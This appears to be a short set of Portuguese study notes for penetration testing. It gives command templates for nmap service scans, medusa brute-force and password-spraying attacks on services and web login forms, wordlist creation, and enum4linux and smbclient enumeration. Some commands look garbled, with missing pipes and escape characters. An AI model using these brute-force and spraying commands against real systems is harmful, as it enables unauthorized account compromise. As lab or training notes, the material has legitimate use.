**#Escaneamento de portas de um endereço**



nmap -sV -p portas ip

sV - indica a versão

p - indica que passará portas a ser escaneada



**#Ataque bruteforce medusa**



medusa -h ip -U lista de usuários -P lista de senhas -M serviço a ser atacado -t quantidade de threads a ser utilizada (6 ideal)



**#Ataque bruteforce formulário medusa**



medusa -h ip -U lista de usuários -P lista de senhas -M http  -m FORM 'parametros'  -m FAILED = 'mensagem de falha' -t quantidade de threads a ser utilizada (6 ideal)



**#Ataque utilizando spray password**



medusa -h ip -U lista de usuários -P lista de senhas -M serviço a ser atacado -t 2 -T 'milisegundos'



criar wordlist



echo -e 'nome1nome2nome3...'  'nome da wordlist.txt'





**#Enumeração com Enum4linux**



enum4linux -a ip  tee nome arquivo para ser gravado a saída do comanto.txt

\- realiza todas as enumerações possíveis



less arquivo gerado -> abre o arquivo



**#Validação da conexão**



'nome do serviço'  'ip'  

ftp 'ip' 

smbclient -L 'ip' -U 'usuario'



